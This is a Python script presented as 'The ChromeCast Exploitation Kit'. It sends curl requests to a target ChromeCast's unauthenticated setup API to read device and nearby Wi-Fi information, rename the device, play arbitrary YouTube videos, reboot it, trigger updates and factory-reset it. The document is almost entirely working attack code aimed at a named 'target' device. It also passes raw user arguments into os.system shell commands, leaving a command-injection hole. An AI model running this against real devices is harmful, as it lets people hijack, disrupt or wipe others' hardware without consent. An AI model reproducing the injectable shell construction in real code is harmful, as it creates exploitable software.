#!/usr/bin/python

import argparse
import os

parser = argparse.ArgumentParser(description='The ChromeCast Exploitation Kit')

parser.add_argument('-l', action='store_true', default=False, dest='list_actions', help='List the possible commands.')
command = parser.add_argument_group('command')
command.add_argument('-a', action='store', dest='action', help='The action you want to perform on your target')
command.add_argument('-v', action='store', dest='value', help='The value for the specified action')
target = parser.add_argument_group('target')
target.add_argument('-t', action='store', dest='target', help='The target ChromeCast you want to exploit')

arguments = parser.parse_args()

t = arguments.target
a = arguments.action
v = arguments.value

if arguments.list_actions:
    print(" ")
    print("available commands:")
    print(" ")
    print("play		: Play a Youtube video with ID specified in the value parameter")
    print("setName		: Set the device name to the value specified in the value parameter")
    print("scanWifi		: Scan nearby Wifi networks")
    print("reboot		: Reboot the device")
    print("update		: Update the ChromeCast over the air")
    print("factoryReset	: Resets the device to Factory Settings (USE WITH CARE)")

# Default action if none is supplied: Get information

if a is None and t is not None:
    os.system('curl http://' + t + ':8008/setup/eureka_info | python -mjson.tool')
elif a == 'setName' and t is not None:
    if v is None:
        print("Error: Please specify a value")
        exit()
    os.system('curl -X POST -H "Content-Type: application/json" -d \'{\"name\": \"' + v + '\"}\' http://' + t + ''
              ':8008/setup/set_eureka_info -v')
elif a == 'play' and t is not None:
    if v is None:
        print("Error: Please specify a value")
        exit()
    os.system('curl -H "Content-Type: application/json" http://' + t + ':8008/apps/YouTube -X POST -d \"v=' + v + '\"')
elif a == 'scanWifi' and t is not None:
    os.system('curl http://' + t + ':8008/setup/scan_results | python -mjson.tool')
elif a == 'reboot' and t is not None:
    os.system('curl -H "Content-Type: application/json" http://' + t + ':8008/setup/reboot -d \'{"params":"now"}\' -X '
                                                                       'POST')
elif a == 'update' and t is not None:
    os.system('curl -H "Content-Type: application/json" http://' + t + ':8008/setup/reboot -d \'{"params":"ota '
                                                                       'foreground"}\' -X POST')
elif a == 'factoryReset' and t is not None:
    if input("Are you sure you want to reset the device to factory settings? (y/n): ") != "y":
        exit()
    os.system('curl -H "Content-Type: application/json" http://' + t + ':8008/setup/reboot -d \'{"params":"fdr"}\' -X '
                                                                       'POST')
elif a is not None and t is None:
    print("Error: Please specify a target device")
